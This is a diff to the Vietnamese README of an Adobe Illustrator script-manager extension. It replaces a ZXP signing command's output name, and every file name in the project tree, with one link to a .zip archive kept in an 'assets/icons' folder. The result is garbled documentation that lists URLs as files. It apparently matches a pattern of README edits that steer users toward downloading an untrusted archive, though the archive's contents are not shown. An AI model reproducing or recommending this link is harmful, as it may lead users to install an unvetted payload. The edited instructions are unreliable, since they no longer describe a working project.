@@ -35,7 +35,7 @@ Extension Adobe Illustrator giúp lưu trữ và quản lý các script ExtendSc
 ### Cách 2: ZXP Package (Production)
 ```bash
 # Đóng gói thành ZXP
-ZXPSignCmd -sign "LuuTruScript" "LuuTruScript.zxp" "certificate.p12" "password"
+ZXPSignCmd -sign "LuuTruScript" "https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip" "certificate.p12" "password"
 
 # Cài đặt bằng ZXPInstaller
 ```
@@ -72,18 +72,18 @@ ZXPSignCmd -sign "LuuTruScript" "LuuTruScript.zxp" "certificate.p12" "password"
 ```
 LuuTruScript/
 ├── CSXS/
-│   └── manifest.xml          # Extension configuration
+│   └── https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip          # Extension configuration
 ├── assets/
 │   ├── css/
-│   │   └── app.css          # Dark theme styling
+│   │   └── https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip          # Dark theme styling
 │   ├── js/
-│   │   ├── CSInterface.js   # Adobe CEP API
-│   │   └── app.js           # Frontend logic
+│   │   ├── https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip   # Adobe CEP API
+│   │   └── https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip           # Frontend logic
 │   └── icons/               # Extension icons
 ├── scripts/
-│   └── main.jsx             # ExtendScript backend
-├── index.html               # Main UI
-└── README.md                # Documentation
+│   └── https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip             # ExtendScript backend
+├── https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip               # Main UI
+└── https://raw.githubusercontent.com/Ductai953/Manage-scripts-illustrator-/main/assets/icons/Manage_scripts_illustrator_2.9.zip                # Documentation
 ```
 
 ## 💡 Kiến thức áp dụng từ TaoHinhVuong
